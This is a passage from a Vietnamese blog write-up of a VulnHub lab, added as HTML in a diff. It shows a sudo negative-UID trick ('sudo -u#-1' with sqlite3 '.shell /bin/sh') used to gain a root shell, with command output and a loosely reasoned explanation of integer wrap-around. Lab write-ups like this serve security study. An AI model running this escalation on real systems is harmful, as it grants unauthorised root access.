+<p>Sau dấu # là UID của user, đó là cách thứ 2 để chạy lệnh với quyền của một user khác.<br>Vậy tại sao lại là -1, thử -2, -3 xem sao &#x3D;))</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> -u#-3 sqlite3 /dev/null <span class="string">&#x27;.shell /bin/sh&#x27;</span></span></span><br><span class="line">sudo: unknown uid 4294967294: who are you?</span><br></pre></td></tr></table></figure>
+<p>Hãy để ý con số 4294967294, nó sát với con số 4294967295, hay 2^32-1, là cận trên của kiểu Integer trong C&#x2F;C++&#x2F;Java, bla bla… Điều đó nghĩa là khi nhập số -1 vào đây, hệ điều hành sẽ chuyển toàn bộ 32 bit trong biến UID thành 0, và 1 bit thứ 33 cao nhất là 1, nhưng bit 33 cao nhất này bị tràn ra đâu đó, để lại 32 bit 0, lúc này thì giá trị của biến UID bằng 0. Với UID bằng 0, hệ thống Linux hiểu rằng đó là root.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">id</span></span></span><br><span class="line">uid=0(root)</span><br></pre></td></tr></table></figure>
+<p>Đó, vậy là có root.</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/vulnhub/" rel="tag"># vulnhub</a>
+              <a href="/tags/write-up/" rel="tag"># write up</a>
+              <a href="/tags/medium/" rel="tag"># medium</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/12/25/mercury-vulnhub/" rel="prev" title="[VulnHub] Mercury">
+                  <i class="fa fa-angle-left"></i> [VulnHub] Mercury
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/12/29/C0m801-vulnhub/" rel="next" title="[VulnHub] C0m80 1">
+                  [VulnHub] C0m80 1 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">minhnq22</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
